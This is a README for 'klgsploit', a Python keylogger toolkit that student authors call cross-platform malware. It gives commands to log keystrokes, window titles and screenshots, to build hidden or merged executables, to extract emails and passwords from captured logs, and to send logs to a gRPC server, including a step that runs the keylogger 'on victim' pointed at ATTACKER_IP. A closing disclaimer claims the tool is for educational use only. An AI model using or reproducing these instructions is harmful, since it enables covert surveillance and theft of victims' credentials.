# keylogger-advprog
a keylogger programmed using python and some advanced tools

## what is this project a summary 
this is like swiss army knife for keylogging attack we made this repo as all in one tool that have all those functionalities 
- keylogging
- saving key with window informations into txt file
- screenshot current window
- send data to grpc server and execute action accordingly server side (classification in this case you can change the action in python scrip and rebuild the executable)
- specify executable malware options and generate it accordingly
- cross platform malware
- the executablefor linux is in the build folder

### first we need to install dependencies
```bash
python3 -m venv venv
source venv/bin/activate
```

### all python dependencies we use
```bash
pip install pynput
pip install pillow
pip install mss
pip install python-xlib
pip install grpcio
pip install grpcio-tools
pip install pyinstaller
pip install ttkbootstrap
```

or just run this one liner
```bash
pip install pynput pillow mss python-xlib grpcio grpcio-tools pyinstaller ttkbootstrap
```

## project structure explained
```
keylogger-advprog/
├── assembled/              # main source code folder
│   ├── klgsploit_cli.py    # cli version of the tool
│   ├── klgsploit_gui.py    # gui version with tabs and buttons
│   ├── keylogtest.py       # linux keylogger module
│   ├── keylogwin.py        # windows keylogger module
│   ├── capture.py          # screenshot capture module
│   ├── classifier.py       # email and password extractor
│   ├── grpcsrv.py          # grpc server to receive keylogs
│   ├── cln.py              # grpc client module
│   └── protos/             # protobuf files for grpc
│       ├── server.proto
│       ├── server_pb2.py
│       └── server_pb2_grpc.py
├── build/                  # compiled executables go here
│   ├── klgsploit_cli       # linux cli executable
│   └── klgsploit_gui       # linux gui executable
├── classifier.py           # standalone classifier script
├── keylog.txt              # output file for captured keys
└── README.md               # you are reading this
```

## how to use klgsploit cli version
the cli tool is the main thing here it does everything from keylogging to generating executables

### run keylogger directly
```bash
cd assembled
python3 klgsploit_cli.py --run
```

### run with timestamps and window titles
```bash
python3 klgsploit_cli.py --run -t -m
```

### run with screenshots every 30 seconds
```bash
python3 klgsploit_cli.py --run -s -i 30
```

### generate executable for linux
```bash
python3 klgsploit_cli.py --genexe mylogger -lnx
```

### generate executable for windows
```bash
python3 klgsploit_cli.py --genexe mylogger -win
```

### generate with all features enabled
```bash
python3 klgsploit_cli.py --genexe superlogger -lnx -t -m -s
```

### classify emails and passwords from log file
```bash
python3 klgsploit_cli.py --classify keylog.txt
```

### start grpc server to receive remote keylogs
```bash
python3 klgsploit_cli.py --server --grpc-port 50051
```

### run keylogger with grpc remote logging
```bash
python3 klgsploit_cli.py --run --grpc 192.168.1.100:50051
```

## cli options reference
| option | what it does |
|--------|--------------|
| `--run` | run keylogger directly |
| `--genexe NAME` | generate executable with pyinstaller |
| `-t` | enable timestamps |
| `-m` | log window titles |
| `-s` | enable screenshots |
| `-i SECONDS` | screenshot interval |
| `-o FILE` | output log file |
| `-win` | target windows |
| `-lnx` | target linux |
| `-mac` | target macos |
| `--grpc HOST:PORT` | send logs to grpc server |
| `--server` | start grpc server mode |
| `--classify FILE` | extract emails passwords from log |
| `--merge EXE1 EXE2` | merge two executables |
| `--noconsole` | hide console window |
| `--onefile` | single file executable |

## how to use klgsploit gui version
if you prefer clicking buttons over typing commands use the gui version

```bash
cd assembled
python3 klgsploit_gui.py
```

it has 6 tabs
- **keylogger** - start stop keylogger configure options
- **screenshots** - manual and auto screenshot capture
- **generate exe** - build executables with custom options
- **classify** - extract emails passwords from logs
- **log viewer** - view and clear keylog output
- **grpc server** - receive remote keylogs

## using the prebuilt executables
we already compiled linux executables in the build folder just run them

```bash
# cli version
./build/klgsploit_cli --help

# gui version
./build/klgsploit_gui
```

## grpc setup for remote logging
if you want to send keylogs to remote server you need to setup grpc

### generate proto files
```bash
cd assembled
python3 -m grpc_tools.protoc -I protos --python_out=protos --grpc_python_out=protos protos/server.proto
```

### fix import in server_pb2_grpc.py
change this line
```python
import server_pb2 as server__pb2
```
to this
```python
from . import server_pb2 as server__pb2
```

### start server on attacker machine
```bash
python3 klgsploit_cli.py --server --grpc-port 50051
```

### run keylogger on victim with grpc
```bash
python3 klgsploit_cli.py --run --grpc ATTACKER_IP:50051
```

## classifier module
the classifier extracts potential emails and passwords from keylog files using regex patterns

### standalone usage
```bash
python3 classifier.py keylog.txt
```

### output format
it creates a json file with this structure
```json
{
  "emails": [
    {"value": "user@example.com", "count": 5}
  ],
  "passwords": [
    {"value": "secretpass123", "count": 2}
  ]
}
```

## cross platform support
the tool works on linux windows and macos

| platform | keylogger | screenshots | window titles |
|----------|-----------|-------------|---------------|
| linux | pynput + xlib | mss/pillow | xlib |
| windows | pynput | pillow | ctypes |
| macos | pynput | pillow | appkit |

## building executables yourself
if you want to compile the executables yourself

### build cli version
```bash
cd assembled
python3 -m PyInstaller --onefile --name klgsploit_cli --distpath ../build klgsploit_cli.py
```

### build gui version
```bash
cd assembled
python3 -m PyInstaller --onefile --noconsole --name klgsploit_gui --distpath ../build klgsploit_gui.py
```

## troubleshooting common issues

### pynput not working on linux
you need to be in input group or run as root
```bash
sudo usermod -aG input $USER
# then logout and login again
```

### xlib import error
install python xlib
```bash
pip install python-xlib
```

### grpc module not found
```bash
pip install grpcio grpcio-tools
```

### screenshot not working
install pillow or mss
```bash
pip install pillow mss
```

### tkinter not found for gui
```bash
# debian/ubuntu
sudo apt install python3-tk

# arch
sudo pacman -S tk
```

## disclaimer
this tool is for educational and authorized security testing only. using keyloggers without permission is illegal. we are not responsible for any misuse of this tool. always get proper authorization before testing on any system.

I AM NOT RESPONSIBLE OF MISSUSE OF THIS TOOL ME OR MY TEAM ARE DOING IT JUST FOR EDUCATIONAL PURPOSES 

## authors
made for advanced programming course project
- WAIL SARI BEY
- ANES RAGOUB
- INES ALLAG
- AMANI SAHRAOUI

## contact us suggestions help contribution
thank you all for contribution suggestions or whatever just contact anyone of the contributers thank you